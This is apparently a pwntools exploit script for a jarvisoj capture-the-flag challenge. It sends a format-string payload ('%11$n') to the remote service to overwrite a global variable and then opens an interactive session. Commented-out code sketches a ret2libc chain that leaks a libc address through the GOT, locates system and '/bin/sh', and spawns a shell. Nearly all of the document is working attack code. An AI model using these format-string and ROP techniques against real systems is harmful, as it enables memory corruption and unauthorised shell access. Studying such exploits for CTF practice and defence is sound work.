#!/usr/bin/env python
# coding=utf-8
from pwn import *
from LibcSearcher import *
nc='pwn2.jarvisoj.com'
point = 9895
#p= ELF('./fm.eaef2247796c11db798a579396482399')
#a= process('./fm.eaef2247796c11db798a579396482399')
#a = remote("localhost", 12345)
a = remote(nc,point)


#pop_rdi_ret = 0x4006b3
#pop_rsi_pop_r15_ret=0x4006b1
x_addr = 0x0804A02C
payload = p32(x_addr)+'%11$n'
#printf(x_address+”%c$n”)可以修改[x_address]的值为x_address的字符长度


a.send(payload)

#payload +=p64(print_addr)
#payload +=p64(print_addr)
#payload+=p64(pop_rdi_ret)
#payload+=p64(1)
#payload+=p64(pop_rsi_pop_r15_ret)
#payload+=p64(p.got['read'])
#payload+=p64(4)
#payload+=p64(p.plt['write'])
#payload+=p64(0x4005E6)

#payload = ''
#payload+=junk
#payload+=p32(0x08048320)+p32(0x08048320)+p32(addr1)
#p.send(payload)

#a.recvline()

#v = a.recv()
#print('---------------------')
#addr=(u64(v[:8]))
#print (addr)
#print('---------------------')
#libc = ELF('./libc-2.19.so')
#libc=LibcSearcher("read", addr)
#libc_base = addr - libc.symbols['read']
#print hex(libc_base)
#print hex(addr)
#system_addr = libc_base + libc.symbols['system']
#binsh_addr = libc_base + libc.search('/bin/sh\x00').next()
#print hex(binsh_addr)
#payload ='A' * 136+p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr)
#a.send(payload)
a.interactive()

